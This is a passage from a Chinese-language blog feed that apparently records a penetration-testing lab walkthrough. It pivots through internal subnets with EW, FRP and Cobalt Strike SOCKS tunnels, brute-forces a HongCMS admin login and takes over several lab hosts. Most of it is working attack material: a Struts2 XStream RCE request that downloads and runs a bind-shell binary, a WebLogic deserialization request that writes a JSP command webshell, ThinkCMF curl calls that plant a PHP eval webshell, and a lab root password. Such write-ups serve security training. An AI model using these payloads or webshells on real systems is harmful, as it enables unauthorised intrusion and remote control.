ff:ff:ff:ff:ff:ff  14</span><br><span class="line">    172.26.2.1       fa:16:3e:e8:10:f2  11</span><br><span class="line">    172.26.2.2       fa:16:3e:20:b5:a6  11</span><br><span class="line">    172.26.2.35      fa:16:3e:e2:d4:c1  11</span><br><span class="line">    172.26.2.174     fa:16:3e:62:60:33  11</span><br><span class="line">    172.26.2.255     ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  14</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.252      00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:<span class="built_in">fc</span>  14</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:<span class="built_in">fc</span>  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line"><span class="comment">## cobaltstrike内网主机存活探测</span></span><br><span class="line">portscan</span><br><span class="line">portscan主要是通过ping syn arp三种方式探测内网存活的主机</span><br></pre></td></tr></table></figure><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><ol><li>msf的 auxiliary&#x2F;server&#x2F;socks_proxy 模块</li></ol><blockquote><p>在该靶场中不稳定，容易断，而且慢</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; options</span><br><span class="line">Module options (auxiliary/server/socks_proxy):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          <span class="built_in">yes</span>       The address to listen on</span><br><span class="line">   SRVPORT   1080             <span class="built_in">yes</span>       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">   VERSION   5                <span class="built_in">yes</span>       The SOCKS version to use (Accepted: 4a, 5)</span><br><span class="line">Auxiliary action:</span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  Run a SOCKS proxy server</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 1.</span><br></pre></td></tr></table></figure><ol start="2"><li>EW</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># VPS</span></span><br><span class="line">./ew_for_linux64 -s rcsocks -l 6611 -e 6000</span><br><span class="line"><span class="comment"># webshell</span></span><br><span class="line">ew1 -s rssocks -d 139.155.49.43 -e 6000</span><br></pre></td></tr></table></figure><ol start="3"><li>FRP</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:&gt; frpc.exe -c frpc.ini</span><br><span class="line">C:&gt; <span class="built_in">type</span> frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 8000</span><br></pre></td></tr></table></figure><ol start="4"><li>CS socks</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; socks 6000</span><br></pre></td></tr></table></figure><ol start="5"><li>连接代理</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># proxychains</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks4 47.101.214.85 8000</span><br><span class="line"># proxifier</span><br></pre></td></tr></table></figure><ol start="6"><li>stowaway很好用</li></ol><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -T4 172.26.2.174</span><br></pre></td></tr></table></figure><h1 id="2-x网段渗透-172-26-2-174-win7-HongCMS"><a href="#2-x网段渗透-172-26-2-174-win7-HongCMS" class="headerlink" title="2.x网段渗透 - 172.26.2.174[win7-HongCMS]"></a>2.x网段渗透 - 172.26.2.174[win7-HongCMS]</h1><h2 id="开放80端口"><a href="#开放80端口" class="headerlink" title="开放80端口"></a>开放80端口</h2><p>配置浏览器代理进行访问</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201357177.png" alt="image-20220920135732962" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201357689.png" alt="image-20220920135746470" style="zoom:50%;" /><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>通过对网页的浏览得到目标为php语言 配置proxifier代理将敏感目录扫描工具代理进内网</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211457165.png" alt="image-20220921145746831"></p><p>通过7kbscan扫描敏感路径得到admin后台路径</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211458869.png" alt="image-20220921145804631"></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>扫到后台不要急着爆破，可以先判断是否存在用户名枚举漏洞，或者说判断出一个用户名是否存在，不然要同时爆破用户名和密码是很麻烦的</p><p>还有一些其他思路也是要考虑到的</p><blockquote><ol><li>SQLMap注入</li></ol><p>sqlmap -r 抓取的文件，，然后跑一遍，康康有莫有注入漏洞</p><ol start="2"><li><p>445端口ms17-010</p></li><li><p>HongCMS</p></li></ol><blockquote><p>WEB后台：<a href="http://172.26.2.174/admin/">http://172.26.2.174/admin/</a></p></blockquote></blockquote><p>由于没有用户名枚举漏洞 尝试用户名和密码一起爆破</p><p>配置burp代理</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201359195.png" alt="image-20220920135901042" style="zoom:50%;" /><p>配置爆破模块</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201359813.png" alt="image-20220920135918633" style="zoom:50%;" /><p>得到用户名和密码为admin&#x2F;admin123456</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201359619.png" alt="image-20220920135931432" style="zoom:50%;" /><p>进入后台getshell。在系统中修改语言模板getshell。存在这种漏洞，笑开花。</p><blockquote><p>如果如果不存在这种傻x式的漏洞，就要去查找cms对应的历史漏洞，再次就是自己挖了，orz</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201359835.png" alt="image-20220920135946607" style="zoom:50%;" /><p>蚁剑配置代理连接 shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.26.2.174/public/languages/Chinese.php  pwd</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201400267.png" alt="image-20220920140009057" style="zoom:50%;" /><p>存在3网段建立二层socks代理</p><h2 id="二层socks代理"><a href="#二层socks代理" class="headerlink" title="二层socks代理"></a>二层socks代理</h2><ol><li>EW</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#VPS:</span></span><br><span class="line">./ew_vps -s lcx_listen -l 6003 -e 6002</span><br><span class="line"><span class="comment">#HongCMS：</span></span><br><span class="line">ew.exe -s ssocksd -l 9999</span><br><span class="line"><span class="comment">#ThinkPHP：</span></span><br><span class="line">ew1 -s lcx_slave -d 47.101.214.85 -e 6002 -f 172.26.2.174 -g 9999</span><br></pre></td></tr></table></figure><ol start="2"><li>FRP</li></ol><ul><li>vps</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = xx.xx.xx.xx</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>Thinkphp</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. frpc.exe -c frpc_1.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_to_2]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 8000</span><br><span class="line"></span><br><span class="line">[socks5_to_3]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line"></span><br><span class="line"><span class="comment">## 需要被代理的本地服务的 IP 地址</span></span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment">## 配合 local_ip</span></span><br><span class="line">local_port = 8001</span><br><span class="line"></span><br><span class="line"><span class="comment">## 用户访问此端口的请求会被转发到 local_ip:local_port</span></span><br><span class="line">remote_port = 8002</span><br><span class="line"></span><br><span class="line">2. frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>HongCMS</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">frpc -c frpc_2.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 172.26.2.182</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5_3]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 8001</span><br></pre></td></tr></table></figure><h2 id="内网存活探测"><a href="#内网存活探测" class="headerlink" title="内网存活探测"></a>内网存活探测</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#扫描存活主机[3网段]</span></span><br><span class="line"><span class="comment">## ping</span></span><br><span class="line"><span class="keyword">for</span> /l %i <span class="keyword">in</span> (1,1,255) <span class="keyword">do</span> @ ping 172.26.3.%i -w 1 -n 1|find /i <span class="string">&quot;ttl=&quot;</span></span><br><span class="line"><span class="comment">## ladon</span></span><br><span class="line">ladon.exe 172.26.3.0/24 OnlinePC</span><br><span class="line">ladon.exe 172.26.3.0/24 portscan</span><br><span class="line"><span class="comment">## nmap</span></span><br><span class="line">proxychains nmap -sT -Pn -T4 172.26.3.0/24</span><br><span class="line"><span class="comment">## arp -a</span></span><br></pre></td></tr></table></figure><h1 id="3-x网段渗透-172-26-3-75-centos-struts2"><a href="#3-x网段渗透-172-26-3-75-centos-struts2" class="headerlink" title="3.x网段渗透 - 172.26.3.75[centos-struts2]"></a>3.x网段渗透 - 172.26.3.75[centos-struts2]</h1><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>struts2-rce</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">msfvenom生成后门,上传到hongcms[172.26.2.174/172.26.3.18]web服务目录中,后面再在poc中远程下载即可，然后getshell</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">poc:</span></span><br><span class="line">POST /orders/3 HTTP/1.1</span><br><span class="line">Host: 172.26.3.75:8080</span><br><span class="line">Content-Length: 2430</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://172.26.3.75:8080</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://172.26.3.75:8080/orders/3/edit</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,la;q=0.8,en;q=0.7</span><br><span class="line">Cookie: JSESSIONID=FB20F1713775958840CAAA6C8703CC5F</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">            &lt;command&gt;</span><br><span class="line">                       &lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">                       &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                       &lt;string&gt;curl -o /tmp/bind7777.elf http://172.26.3.18/bind7777.elf&lt;/string&gt;</span><br><span class="line">            &lt;/command&gt;</span><br><span class="line">                      </span><br><span class="line">&lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      </span><br><span class="line">&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改<span class="built_in">command</span></span></span><br><span class="line">&lt;command&gt;</span><br><span class="line">            &lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">            &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">            &lt;string&gt;chmod +x /tmp/bind7777.elf&lt;/string&gt;</span><br><span class="line">&lt;/command&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改<span class="built_in">command</span></span></span><br><span class="line">&lt;command&gt;</span><br><span class="line">            &lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">            &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">            &lt;string&gt;./tmp/bind7777.elf&lt;/string&gt;</span><br><span class="line">&lt;/command&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>ssh登录</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root/hacking@hetian</span><br></pre></td></tr></table></figure><ol start="3"><li>msf的s2-045模块</li></ol><p>msf自带struts2历史漏洞利用模块</p><h2 id="MSF连接上线"><a href="#MSF连接上线" class="headerlink" title="MSF连接上线"></a>MSF连接上线</h2><p>meterpreter后渗透 [无其他网段]</p><h2 id="struts2漏洞利用工具"><a href="#struts2漏洞利用工具" class="headerlink" title="struts2漏洞利用工具"></a>struts2漏洞利用工具</h2><p>通过proxychains将struts2漏洞利用工具代理进内网扫描</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211552045.png" alt="image-20220921155257805" style="zoom:50%;" /><h1 id="3-x网段渗透-172-26-3-27-centos-weblogic"><a href="#3-x网段渗透-172-26-3-27-centos-weblogic" class="headerlink" title="3.x网段渗透 - 172.26.3.27[centos-weblogic]"></a>3.x网段渗透 - 172.26.3.27[centos-weblogic]</h1><h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>weblogic-poc</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上马poc[利用方法、工具多样，这里只列举一种]</span></span><br><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 172.26.3.27:7001</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.58</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1112</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.xmlDecoder&quot;&gt;&lt;object class=&quot;java.io.PrintWriter&quot;&gt;&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[</span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[1024];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    %&gt;]]&gt;</span><br><span class="line">&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问马</span></span><br><span class="line">http://172.26.3.78:7001/_async/webshell.jsp?pwd=123&amp;cmd=ls</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">msfvenom生成后门，上传到HongCMS[172.26.2.174/172.26.3.18]web服务目录中</span></span><br><span class="line">http://172.26.3.78:7001/_async/webshell.jsp?pwd=123&amp;cmd=wget%20http://172.26.3.18/bind7778.elf</span><br></pre></td></tr></table></figure><ol start="2"><li>weblogic漏洞利用工具</li></ol><blockquote><p>weblogic scan扫一扫有莫有历史漏洞，再利用即可</p></blockquote><ol start="3"><li>msf的weblogic利用模块</li></ol><blockquote><p>msf也有利用模块 search即可</p></blockquote><h2 id="执行后门，msf连接上线"><a href="#执行后门，msf连接上线" class="headerlink" title="执行后门，msf连接上线"></a>执行后门，msf连接上线</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://172.26.3.78:7001/_async/webshell.jsp?pwd=123&amp;cmd=./bind7778.elf</span><br></pre></td></tr></table></figure><h2 id="后渗透-可以发现4网段"><a href="#后渗透-可以发现4网段" class="headerlink" title="后渗透 [可以发现4网段]"></a>后渗透 [可以发现4网段]</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; ifconfig</span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"><span class="comment">#扫描存活主机[4网段]</span></span><br><span class="line"><span class="comment">#ping.sh[需要在linux上进行编辑]</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> &#123;1..254&#125;;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ip=172.26.4.<span class="variable">$num</span></span><br><span class="line">    ping -c1 <span class="variable">$ip</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">if</span> [ $? = 0 ];</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> ok</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> fail</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="添加路由、设置三层代理"><a href="#添加路由、设置三层代理" class="headerlink" title="添加路由、设置三层代理"></a>添加路由、设置三层代理</h2><ol><li>msf添加路由</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 172.26.4.0/24</span><br></pre></td></tr></table></figure><ol start="2"><li>ew三层代理</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#vps  ./ew_for_linux64 -s rcsocks -l 10078 -e 6699</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将Vps6699与HongCms的7778端口绑定建立socks5代理</span></span><br><span class="line">Thinkphp ./ew1 -s lcx_slave -d 119.45.175.218 -e 6699 -f 172.26.2.174 -g 7778</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地启动流量转发，将来自外部7778端口的流量转发到本地的10011端口</span></span><br><span class="line">HongCms ew2.exe -s lcx_listen -l 7778 -e 10011</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动socks5服务，并反弹到HongCms的10011端口</span></span><br><span class="line">weblogic ./ew3 -s rssocks -d 172.26.3.18 -e 10011</span><br></pre></td></tr></table></figure><ol start="3"><li>frp三层代理</li></ol><ul><li>VPS</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 47.101.214.85</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>Thinkphp</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. frpc.exe -c frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_to_2]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6001</span><br><span class="line"></span><br><span class="line">[socks5_to_3]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6002</span><br><span class="line">remote_port = 6003</span><br><span class="line"></span><br><span class="line">[socks5_4]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6004</span><br><span class="line">remote_port = 6005</span><br><span class="line"></span><br><span class="line">2. frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>HongCMS</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. frpc -c frpc_3.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 172.26.2.182</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_3]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6002</span><br><span class="line"></span><br><span class="line">[socks5_4]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6006</span><br><span class="line">remote_port = 6004</span><br><span class="line"></span><br><span class="line">2. frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>Weblogic</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frpc -c frpc_4.ini</span><br><span class="line">frpc -c frpc_4.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 172.26.3.18</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_4]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6006</span><br></pre></td></tr></table></figure><h1 id="4-x网段渗透-172-26-4-22-win7-thinkcmf"><a href="#4-x网段渗透-172-26-4-22-win7-thinkcmf" class="headerlink" title="4.x网段渗透-172.26.4.22 [win7-thinkcmf]"></a>4.x网段渗透-172.26.4.22 [win7-thinkcmf]</h1><h2 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>thinkcmf任意文件写入</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入phpinfo[这里可以直接在172.26.3.78 weblogic靶机上直接使用curl访问，也可以连接代理通过浏览器访问]</span></span><br><span class="line">curl &quot;http://172.26.4.22/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=%3Cphp%3Efile_put_contents(%27test.php%27,%27%3C?php%20phpinfo();?%3E%27)%3C/php%3E&quot;</span><br><span class="line"></span><br><span class="line">http://172.26.4.22/index.php?a=display&amp;templateFile=test.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入马</span></span><br><span class="line">curl &quot;http://172.26.4.22/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=%3Cphp%3Efile_put_contents(%27mingy.php%27,%27%3C?php%20@eval(\$_POST[ccc]);?%3E%27)%3C/php%3E&quot;</span><br><span class="line"></span><br><span class="line">http://172.26.4.22/index.php?a=display&amp;templateFile=mingy.php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">菜刀代理连接马</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">msfvenom生成bind_tcp后门，并通过webshell上传运行，msf连接上线</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211606777.png" alt="image-20220921160624554" style="zoom:50%;" /><ol start="2"><li>ms17-010</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows命令行下载文件</title>
      <link href="/2022-09-17-%E7%9F%A5%E8%AF%86/Windows/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/"/>
      <url>/2022-09-17-%E7%9F%A5%E8%AF%86/Windows/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/</url>
      
